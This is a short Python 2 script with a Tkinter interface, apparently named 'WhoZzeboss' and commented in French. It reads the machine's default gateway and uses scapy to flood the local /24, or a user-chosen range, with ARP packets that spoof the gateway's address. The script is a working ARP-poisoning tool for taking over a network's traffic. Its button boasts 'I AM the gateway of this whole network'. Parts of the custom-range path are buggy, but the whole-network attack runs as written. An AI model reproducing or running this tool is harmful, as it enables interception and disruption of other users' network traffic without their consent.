from scapy.all import *
from Tkinter import *
import socket, struct
 #Read the default gateway directly from /proc.
def get_default_gateway_linux():
	with open("/proc/net/route") as fh:
		for line in fh:
			fields = line.strip().split()
			if fields[1] != '00000000' or not int(fields[3], 16) & 2:
				continue
			return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
net1 = get_default_gateway_linux().split('.')[0]
net2 = get_default_gateway_linux().split('.')[1]
net3 = get_default_gateway_linux().split('.')[2]

network = str(net1) + '.' + str(net2) + '.' + str(net3) + '.'
rangenetall = network + '1-254'


def pwnall():
	a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangenetall)
	print "Je pownerai cet intervalle : " + rangenetall
	sendp(a,inter=RandNum(2,10),loop=1)
	
def pwncust(premadr,dernadr):
	rangecust = network + premadr + "-" + dernadr
	print "Je pownerai cet intervalle : " + rangecust
	a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangecust)
	sendp(a,inter=RandNum(2,10),loop=1)


	#classe pour instancier une "frame" Tkinter
#class Application(Frame): 
#initialisation de cette instance"""
#	def __init__(self,master):
#		Frame.__init__(self,master)
#		self.grid()
#		self.creation_item()
#	def creation_item(self):
#methode de creation d'item
#		self.submit_button = Button(self,text = "Je SUIS la gateway de ce reseau!!!", command = self.action())
#		self.submit_button.grid(row = 0, column = 0, sticky = W)
#		
#		self.text = Text(self, width = 35, height = 5, wrap = WORD)
#		self.text.grid(row = 1, column = 0, sticky = W)
#
#	def action(self):
#agit et affiche un message
#		pwn()
#		self.text.insert(0.0,"C'est VOUS la gateway de ce reseau.")

root = Tk()
root.title("WhoZzeboss")
root.geometry("600x150")

app = Frame(root)
app.grid()
msgbttn = "Je SUIS la gateway de tout ce reseau!!!"
customiz = BooleanVar()
customiz.set(False)
etatcheck = False
case_premadr = Entry(app, bg= "#BBBBBB")
case_dernadr = Entry(app, bg= "#BBBBBB")
result = Label(app, text = "Allez, un peu de courage... Appuyez!")


def swcustom():
	if etatcheck == False:
		case_premadr["bg"] = "#BBBBBB"
		case_dernadr["bg"] = "#BBBBBB"
		msgbttn = "Je SUIS la gateway de tout ce reseau!!!"
	if etatcheck == True:
		case_premadr["bg"] = "#FFFFFF"
		case_dernadr["bg"] = "#FFFFFF"
		msgbttn = "VOUS allez manger !!!!"
		
checkchoix = Checkbutton(app, text = "Range cible", variable = customiz, command = swcustom)
checkchoix.var = etatcheck

case_premadr.grid(row = 0,column = 1, columnspan = 1, sticky = W)

case_dernadr.grid(row = 0,column = 2, columnspan = 1, sticky = W)

result.grid(row = 2, column = 0)

checkchoix.grid(row = 0, column = 0, sticky = W)

result.grid(row = 2, column = 0)

def action():
#agit et affiche un message
	result["text"] = "Spawnage en cours..."
	if etatcheck == True:
		pwncust(app.case_premadr.get(),app.case_dernadr.get())
	if etatcheck == False:
		pwnall()
	
submit_button = Button(app,text = msgbttn, command = action)
submit_button.grid(row = 1, column = 0, sticky = W)


root.mainloop()